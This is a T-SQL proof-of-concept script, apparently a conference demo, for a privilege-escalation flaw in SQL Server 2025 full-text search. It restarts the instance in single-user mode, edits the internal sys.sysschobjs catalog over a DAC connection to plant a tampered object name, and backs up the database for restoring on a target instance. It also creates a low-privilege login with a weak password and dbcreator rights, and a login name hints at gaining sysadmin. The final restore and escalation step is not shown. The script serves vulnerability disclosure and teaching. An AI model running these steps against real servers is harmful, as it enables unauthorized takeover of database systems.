/*
  PASS Summit 2026
  Author: Fabiano Amorim | fabianonevesamorim@hotmail.com
*/

/*
  New features = new code, new code = new vulnerabilities.
  SQL2025 had some big changes around fulltext search. 
  https://learn.microsoft.com/en-us/sql/relational-databases/search/full-text-index-version-upgrade?view=sql-server-ver17
  After spending some time studying what changed, I found an interesting vulnerability.
*/

/* Step 1. Create a tampered DB to be restored */
-- Create a db
USE master
GO
IF DB_ID('DbAppDemo3') IS NOT NULL
BEGIN
  ALTER DATABASE DbAppDemo3 SET SINGLE_USER WITH ROLLBACK IMMEDIATE
  DROP DATABASE DbAppDemo3
END
CREATE DATABASE DbAppDemo3
GO
USE DbAppDemo3
GO
CREATE TABLE dbo.FTDocuments
(
    DocumentId   int NOT NULL CONSTRAINT PK_FTDocuments PRIMARY KEY,
    FileName     nvarchar(260) NOT NULL,
    Extension    varchar(20) NOT NULL,
    DocumentData varbinary(max) NULL
);
GO
CREATE FULLTEXT CATALOG FTCatalog AS DEFAULT;;
GO
CREATE FULLTEXT INDEX ON dbo.FTDocuments (DocumentData TYPE COLUMN Extension)
KEY INDEX PK_FTDocuments
ON FTCatalog
WITH CHANGE_TRACKING MANUAL;
GO

/* Stop the instance -- net stop "SQL Server (SQL2025)" */
/* Start has single user -- net start "SQL Server (SQL2025)" /m"TestSQLFabiano1" */
/* Make sure you are adjusting SSMS additional connection parameters to add the app name (Application Name=TestSQLFabiano) and connect as DAC */
 
/* This need to be executed with SQL on single user and from a DAC connection */
USE DbAppDemo3
GO
/* Update internal catalog to set the name internal processing is looking for */
UPDATE sys.sysschobjs SET name = 'fulltext_index_failed_docid_' + CONVERT(VARCHAR, OBJECT_ID('FTDocuments'))
WHERE name = 'fulltext_avdl_' + CONVERT(VARCHAR, OBJECT_ID('FTDocuments'))
GO
CHECKPOINT
GO


/* Stop the instance -- net stop "SQL Server (SQL2025)" */
/* Start the instance -- net start "SQL Server (SQL2025)" */
/* Reconnect on SQL using a non-dac connection */

/* Backup the DB, we'll restore this on instance we want to hack */
BACKUP DATABASE DbAppDemo3 TO DISK = N'C:\Temp\Backup\DbAppDemo3.bak' 
WITH NAME = N'DbAppDemo3-Full Database Backup'
GO


-- Create a login for the app user
IF SUSER_ID('AppDemo3') IS NOT NULL
  DROP LOGIN AppDemo3;

CREATE LOGIN AppDemo3 WITH PASSWORD=N'102030', CHECK_POLICY=OFF;
GO
GRANT CREATE ANY DATABASE TO AppDemo3
GO
ALTER SERVER ROLE dbcreator ADD MEMBER AppDemo3
GO
IF SUSER_SID('*** Demo 3 - I Should Not Be Here I''m a SysAdmin now ***') IS NOT NULL
  DROP LOGIN [*** Demo 3 - I Should Not Be Here I'm a SysAdmin now ***]
GO

USE DbAppDemo3
GO
CREATE USER AppDemo3 FOR LOGIN AppDemo3
GO
ALTER ROLE db_owner ADD MEMBER AppDemo3
GO
USE master
GO
DROP DATABASE DbAppDemo3
GO